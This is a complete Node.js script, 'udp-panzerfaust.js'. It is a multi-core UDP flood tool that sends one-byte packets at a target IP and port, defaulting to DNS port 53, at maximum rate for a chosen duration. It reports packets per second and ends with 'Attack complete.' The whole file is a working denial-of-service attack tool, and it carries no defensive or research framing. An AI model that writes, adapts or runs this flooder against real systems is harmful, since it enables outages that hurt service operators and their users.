const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]) || 53;
const duration = parseInt(process.argv[4]);

if (!target || isNaN(duration)) {
  console.log('Usage: node udp-panzerfaust.js <target_ip> <port> <duration_seconds>');
  process.exit(1);
}

const endTime = Date.now() + duration * 1000;
const payload = Buffer.alloc(1);
const cpuCount = os.cpus().length;

const SAFE_MEM_THRESHOLD = 85;

function getCpuUsage() {
  const cpus = os.cpus();
  let idle = 0, total = 0;
  cpus.forEach(cpu => {
    for (let type in cpu.times) total += cpu.times[type];
    idle += cpu.times.idle;
  });
  return { idle: idle / cpus.length, total: total / cpus.length };
}

if (cluster.isMaster) {
  let totalSent = 0;
  let maxPPS = 0;

  console.clear();
  console.log('UDP-PANZERFAUST [MAX PPS + STABILITY]');
  console.log('--------------------------------------');
  console.log(`Target: ${target}:${port}`);
  console.log(`Duration: ${duration}s`);
  console.log(`Cores: ${cpuCount}`);
  console.log('Launching...\n');

  let cpuStart = getCpuUsage();

  for (let i = 0; i < cpuCount; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        totalSent += msg.sent;
        if (msg.pps > maxPPS) maxPPS = msg.pps;
      }
    });
  }

  setInterval(() => {
    const cpuEnd = getCpuUsage();
    const idleDiff = cpuEnd.idle - cpuStart.idle;
    const totalDiff = cpuEnd.total - cpuStart.total;
    const cpuUsage = 100 - Math.floor((idleDiff / totalDiff) * 100);
    cpuStart = cpuEnd;

    console.clear();
    console.log('UDP-PANZERFAUST [MAX PPS + STABILITY]');
    console.log('--------------------------------------');
    console.log(`Total Packets Sent: ${totalSent.toLocaleString()}`);
    console.log(`Max PPS: ${maxPPS.toLocaleString()}`);
    console.log(`CPU Usage: ${cpuUsage}%`);
    console.log(`Target: ${target}:${port}`);
    console.log('--------------------------------------');

    maxPPS = 0;
  }, 5000); // Refresh every 5s

  setTimeout(() => {
    console.log('\nAttack complete.');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

} else {
  const sock = dgram.createSocket('udp4');
  sock.unref(); // Let process exit naturally
  sock.bind(() => {
    sock.setSendBufferSize(4 * 1024 * 1024); // Increase socket buffer
  });

  let sent = 0;
  let pps = 0;
  let isThrottled = false;

  function getMemoryUsagePercent() {
    const mem = process.memoryUsage();
    const usedMB = mem.rss / 1024 / 1024;
    const totalMB = os.totalmem() / 1024 / 1024;
    return (usedMB / totalMB) * 100;
  }

  function spam() {
    while (Date.now() < endTime) {
      if (isThrottled) {
        Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 10000); // 10s pause
        isThrottled = false;
        continue;
      }

      for (let i = 0; i < 10000; i++) {
        try {
          sock.send(payload, port, target);
          sent++;
          pps++;
        } catch (err) {
          // Swallow any async UDP errors silently
        }
      }
    }
  }

  setInterval(() => {
    const memUsage = getMemoryUsagePercent();
    if (!isThrottled && memUsage > SAFE_MEM_THRESHOLD) {
      isThrottled = true;
    }
  }, 500);

  setInterval(() => {
    process.send({ type: 'stats', sent, pps });
    sent = 0;
    pps = 0;
  }, 1000);

  spam();
}
